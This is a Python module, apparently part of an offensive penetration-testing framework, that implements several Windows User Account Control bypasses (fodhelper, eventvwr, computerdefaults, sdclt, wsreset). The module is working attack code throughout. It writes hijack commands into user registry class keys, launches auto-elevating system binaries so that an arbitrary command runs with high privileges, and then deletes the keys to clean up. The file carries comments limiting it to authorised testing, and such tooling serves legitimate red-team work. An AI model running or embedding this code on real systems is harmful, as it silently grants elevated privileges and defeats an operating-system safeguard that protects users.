#!/usr/bin/env python3
"""
UAC 绕过模块 - UAC Bypass Module
ATT&CK Technique: T1548.002 - Bypass User Account Control

提供多种 UAC 绕过技术
仅用于授权渗透测试和安全研究

Warning: 仅限授权渗透测试使用！
"""

import logging
import platform
from dataclasses import dataclass
from enum import Enum
from typing import Any, Dict, List, Optional

from ..base import EscalationMethod, EscalationResult, PrivilegeLevel

logger = logging.getLogger(__name__)


class UACBypassTechnique(Enum):
    """UAC 绕过技术"""

    FODHELPER = "fodhelper"
    EVENTVWR = "eventvwr"
    COMPUTERDEFAULTS = "computerdefaults"
    SDCLT = "sdclt"
    SILENTCLEANUP = "silentcleanup"
    CMSTP = "cmstp"
    WSRESET = "wsreset"


@dataclass
class UACInfo:
    """UAC 配置信息"""

    enabled: bool = True
    level: int = 5  # 0-5, 0=disabled
    consent_behavior_admin: int = 5
    consent_behavior_user: int = 3
    prompt_on_secure_desktop: bool = True

    def to_dict(self) -> Dict[str, Any]:
        return {
            "enabled": self.enabled,
            "level": self.level,
            "consent_behavior_admin": self.consent_behavior_admin,
            "consent_behavior_user": self.consent_behavior_user,
            "prompt_on_secure_desktop": self.prompt_on_secure_desktop,
        }


class UACBypass:
    """
    UAC 绕过模块

    实现多种 UAC 绕过技术

    Usage:
        bypass = UACBypass()
        result = bypass.execute()
        # 或指定技术
        result = bypass.execute(UACBypassTechnique.FODHELPER)

    Warning: 仅限授权渗透测试使用！
    """

    def __init__(self):
        self.logger = logging.getLogger(f"{__name__}.UACBypass")
        self._uac_info: Optional[UACInfo] = None

    def get_uac_info(self) -> UACInfo:
        """获取当前 UAC 配置"""
        if self._uac_info:
            return self._uac_info

        info = UACInfo()

        try:
            import subprocess

            # 检查 EnableLUA
            result = subprocess.run(
                [
                    "reg",
                    "query",
                    "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                    "/v",
                    "EnableLUA",
                ],
                capture_output=True,
                text=True,
                timeout=10,
            )
            if "0x0" in result.stdout:
                info.enabled = False

            # 检查 ConsentPromptBehaviorAdmin
            result = subprocess.run(
                [
                    "reg",
                    "query",
                    "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                    "/v",
                    "ConsentPromptBehaviorAdmin",
                ],
                capture_output=True,
                text=True,
                timeout=10,
            )
            for line in result.stdout.split("\n"):
                if "ConsentPromptBehaviorAdmin" in line:
                    parts = line.split()
                    if parts:
                        try:
                            info.consent_behavior_admin = int(parts[-1], 16)
                        except ValueError:
                            pass

            self._uac_info = info

        except Exception as e:
            self.logger.warning(f"Failed to get UAC info: {e}")

        return info

    def check_is_elevated(self) -> bool:
        """检查当前进程是否已提升"""
        try:
            import ctypes

            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except (AttributeError, OSError, ValueError):
            return False

    def get_available_techniques(self) -> List[UACBypassTechnique]:
        """获取当前系统可用的绕过技术"""

        available = []

        # 检查各种绕过工具是否存在
        technique_binaries = {
            UACBypassTechnique.FODHELPER: "C:\\Windows\\System32\\fodhelper.exe",
            UACBypassTechnique.EVENTVWR: "C:\\Windows\\System32\\eventvwr.exe",
            UACBypassTechnique.COMPUTERDEFAULTS: "C:\\Windows\\System32\\computerdefaults.exe",
            UACBypassTechnique.SDCLT: "C:\\Windows\\System32\\sdclt.exe",
            UACBypassTechnique.WSRESET: "C:\\Windows\\System32\\wsreset.exe",
        }

        from pathlib import Path

        for technique, binary_path in technique_binaries.items():
            if Path(binary_path).exists():
                available.append(technique)

        return available

    def execute(
        self, technique: Optional[UACBypassTechnique] = None, command: str = "cmd.exe"
    ) -> EscalationResult:
        """
        执行 UAC 绕过

        Args:
            technique: 使用的绕过技术，为 None 时自动选择
            command: 要以提升权限执行的命令

        Returns:
            EscalationResult
        """
        # 平台检测
        if platform.system() != "Windows":
            return EscalationResult(
                success=False,
                method=EscalationMethod.UAC_BYPASS,
                from_level=PrivilegeLevel.MEDIUM,
                to_level=PrivilegeLevel.MEDIUM,
                error="UAC Bypass is only supported on Windows",
            )

        from_level = PrivilegeLevel.MEDIUM

        # 检查是否已经提升
        if self.check_is_elevated():
            return EscalationResult(
                success=True,
                method=EscalationMethod.UAC_BYPASS,
                from_level=PrivilegeLevel.HIGH,
                to_level=PrivilegeLevel.HIGH,
                output="Already elevated",
            )

        # 检查 UAC 是否禁用
        uac_info = self.get_uac_info()
        if not uac_info.enabled:
            return EscalationResult(
                success=True,
                method=EscalationMethod.UAC_BYPASS,
                from_level=from_level,
                to_level=PrivilegeLevel.HIGH,
                output="UAC is disabled",
            )

        # 自动选择技术
        if technique is None:
            available = self.get_available_techniques()
            if not available:
                return EscalationResult(
                    success=False,
                    method=EscalationMethod.UAC_BYPASS,
                    from_level=from_level,
                    to_level=from_level,
                    error="No available UAC bypass technique",
                )
            technique = available[0]

        # 执行对应技术
        try:
            if technique == UACBypassTechnique.FODHELPER:
                return self._fodhelper_bypass(command)
            elif technique == UACBypassTechnique.EVENTVWR:
                return self._eventvwr_bypass(command)
            elif technique == UACBypassTechnique.COMPUTERDEFAULTS:
                return self._computerdefaults_bypass(command)
            elif technique == UACBypassTechnique.SDCLT:
                return self._sdclt_bypass(command)
            elif technique == UACBypassTechnique.WSRESET:
                return self._wsreset_bypass(command)
            else:
                return EscalationResult(
                    success=False,
                    method=EscalationMethod.UAC_BYPASS,
                    from_level=from_level,
                    to_level=from_level,
                    error=f"Unsupported technique: {technique.value}",
                )
        except Exception as e:
            return EscalationResult(
                success=False,
                method=EscalationMethod.UAC_BYPASS,
                from_level=from_level,
                to_level=from_level,
                error=str(e),
            )

    def _fodhelper_bypass(self, command: str) -> EscalationResult:
        """
        使用 fodhelper.exe 绕过 UAC

        原理：fodhelper.exe 是高完整性级别的自动提升程序，
        它会读取 HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command
        注册表键中的命令并执行
        """
        import subprocess
        import time

        reg_path = "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command"

        try:
            # 创建注册表键
            subprocess.run(["reg", "add", reg_path, "/f"], capture_output=True, timeout=10)

            # 设置默认值为要执行的命令
            subprocess.run(
                ["reg", "add", reg_path, "/ve", "/t", "REG_SZ", "/d", command, "/f"],
                capture_output=True,
                timeout=10,
            )

            # 添加 DelegateExecute 空值
            subprocess.run(
                ["reg", "add", reg_path, "/v", "DelegateExecute", "/t", "REG_SZ", "/d", "", "/f"],
                capture_output=True,
                timeout=10,
            )

            # 执行 fodhelper.exe
            subprocess.Popen(
                ["C:\\Windows\\System32\\fodhelper.exe"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

            # 等待执行
            time.sleep(2)

            # 清理注册表
            subprocess.run(
                ["reg", "delete", "HKCU\\Software\\Classes\\ms-settings", "/f"],
                capture_output=True,
                timeout=10,
            )

            return EscalationResult(
                success=True,
                method=EscalationMethod.UAC_BYPASS,
                from_level=PrivilegeLevel.MEDIUM,
                to_level=PrivilegeLevel.HIGH,
                output=f"fodhelper bypass executed: {command}",
                cleanup_command="reg delete HKCU\\Software\\Classes\\ms-settings /f",
            )

        except Exception as e:
            # 尝试清理
            try:
                subprocess.run(
                    ["reg", "delete", "HKCU\\Software\\Classes\\ms-settings", "/f"],
                    capture_output=True,
                    timeout=10,
                )
            except Exception as exc:
                logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

            return EscalationResult(
                success=False,
                method=EscalationMethod.UAC_BYPASS,
                from_level=PrivilegeLevel.MEDIUM,
                to_level=PrivilegeLevel.MEDIUM,
                error=f"fodhelper bypass failed: {e}",
            )

    def _eventvwr_bypass(self, command: str) -> EscalationResult:
        """
        使用 eventvwr.exe 绕过 UAC

        原理：eventvwr.exe 会查找 HKCU\\Software\\Classes\\mscfile\\shell\\open\\command
        """
        import subprocess
        import time

        reg_path = "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command"

        try:
            # 创建注册表键
            subprocess.run(["reg", "add", reg_path, "/f"], capture_output=True, timeout=10)

            # 设置默认值
            subprocess.run(
                ["reg", "add", reg_path, "/ve", "/t", "REG_SZ", "/d", command, "/f"],
                capture_output=True,
                timeout=10,
            )

            # 执行 eventvwr.exe
            subprocess.Popen(
                ["C:\\Windows\\System32\\eventvwr.exe"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

            time.sleep(2)

            # 清理
            subprocess.run(
                ["reg", "delete", "HKCU\\Software\\Classes\\mscfile", "/f"],
                capture_output=True,
                timeout=10,
            )

            return EscalationResult(
                success=True,
                method=EscalationMethod.UAC_BYPASS,
                from_level=PrivilegeLevel.MEDIUM,
                to_level=PrivilegeLevel.HIGH,
                output=f"eventvwr bypass executed: {command}",
                cleanup_command="reg delete HKCU\\Software\\Classes\\mscfile /f",
            )

        except Exception as e:
            try:
                subprocess.run(
                    ["reg", "delete", "HKCU\\Software\\Classes\\mscfile", "/f"],
                    capture_output=True,
                    timeout=10,
                )
            except Exception as exc:
                logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

            return EscalationResult(
                success=False,
                method=EscalationMethod.UAC_BYPASS,
                from_level=PrivilegeLevel.MEDIUM,
                to_level=PrivilegeLevel.MEDIUM,
                error=f"eventvwr bypass failed: {e}",
            )

    def _computerdefaults_bypass(self, command: str) -> EscalationResult:
        """使用 computerdefaults.exe 绕过 UAC"""
        import subprocess
        import time

        reg_path = "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command"

        try:
            subprocess.run(["reg", "add", reg_path, "/f"], capture_output=True, timeout=10)
            subprocess.run(
                ["reg", "add", reg_path, "/ve", "/t", "REG_SZ", "/d", command, "/f"],
                capture_output=True,
                timeout=10,
            )
            subprocess.run(
                ["reg", "add", reg_path, "/v", "DelegateExecute", "/t", "REG_SZ", "/d", "", "/f"],
                capture_output=True,
                timeout=10,
            )

            subprocess.Popen(
                ["C:\\Windows\\System32\\computerdefaults.exe"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

            time.sleep(2)

            subprocess.run(
                ["reg", "delete", "HKCU\\Software\\Classes\\ms-settings", "/f"],
                capture_output=True,
                timeout=10,
            )

            return EscalationResult(
                success=True,
                method=EscalationMethod.UAC_BYPASS,
                from_level=PrivilegeLevel.MEDIUM,
                to_level=PrivilegeLevel.HIGH,
                output=f"computerdefaults bypass executed: {command}",
            )

        except Exception as e:
            return EscalationResult(
                success=False,
                method=EscalationMethod.UAC_BYPASS,
                from_level=PrivilegeLevel.MEDIUM,
                to_level=PrivilegeLevel.MEDIUM,
                error=str(e),
            )

    def _sdclt_bypass(self, command: str) -> EscalationResult:
        """使用 sdclt.exe 绕过 UAC"""
        import subprocess
        import time

        reg_path = "HKCU\\Software\\Classes\\Folder\\shell\\open\\command"

        try:
            subprocess.run(["reg", "add", reg_path, "/f"], capture_output=True, timeout=10)
            subprocess.run(
                ["reg", "add", reg_path, "/ve", "/t", "REG_SZ", "/d", command, "/f"],
                capture_output=True,
                timeout=10,
            )
            subprocess.run(
                ["reg", "add", reg_path, "/v", "DelegateExecute", "/t", "REG_SZ", "/d", "", "/f"],
                capture_output=True,
                timeout=10,
            )

            subprocess.Popen(
                ["C:\\Windows\\System32\\sdclt.exe"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

            time.sleep(3)

            subprocess.run(
                ["reg", "delete", "HKCU\\Software\\Classes\\Folder", "/f"],
                capture_output=True,
                timeout=10,
            )

            return EscalationResult(
                success=True,
                method=EscalationMethod.UAC_BYPASS,
                from_level=PrivilegeLevel.MEDIUM,
                to_level=PrivilegeLevel.HIGH,
                output=f"sdclt bypass executed: {command}",
            )

        except Exception as e:
            return EscalationResult(
                success=False,
                method=EscalationMethod.UAC_BYPASS,
                from_level=PrivilegeLevel.MEDIUM,
                to_level=PrivilegeLevel.MEDIUM,
                error=str(e),
            )

    def _wsreset_bypass(self, command: str) -> EscalationResult:
        """使用 wsreset.exe 绕过 UAC"""
        import subprocess
        import time

        reg_path = (
            "HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635ber5d0r5xdl3e8\\Shell\\open\\command"
        )

        try:
            subprocess.run(["reg", "add", reg_path, "/f"], capture_output=True, timeout=10)
            subprocess.run(
                ["reg", "add", reg_path, "/ve", "/t", "REG_SZ", "/d", command, "/f"],
                capture_output=True,
                timeout=10,
            )
            subprocess.run(
                ["reg", "add", reg_path, "/v", "DelegateExecute", "/t", "REG_SZ", "/d", "", "/f"],
                capture_output=True,
                timeout=10,
            )

            subprocess.Popen(
                ["C:\\Windows\\System32\\wsreset.exe"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

            time.sleep(3)

            subprocess.run(
                [
                    "reg",
                    "delete",
                    "HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635ber5d0r5xdl3e8",
                    "/f",
                ],
                capture_output=True,
                timeout=10,
            )

            return EscalationResult(
                success=True,
                method=EscalationMethod.UAC_BYPASS,
                from_level=PrivilegeLevel.MEDIUM,
                to_level=PrivilegeLevel.HIGH,
                output=f"wsreset bypass executed: {command}",
            )

        except Exception as e:
            return EscalationResult(
                success=False,
                method=EscalationMethod.UAC_BYPASS,
                from_level=PrivilegeLevel.MEDIUM,
                to_level=PrivilegeLevel.MEDIUM,
                error=str(e),
            )


__all__ = ["UACBypass", "UACBypassTechnique", "UACInfo"]
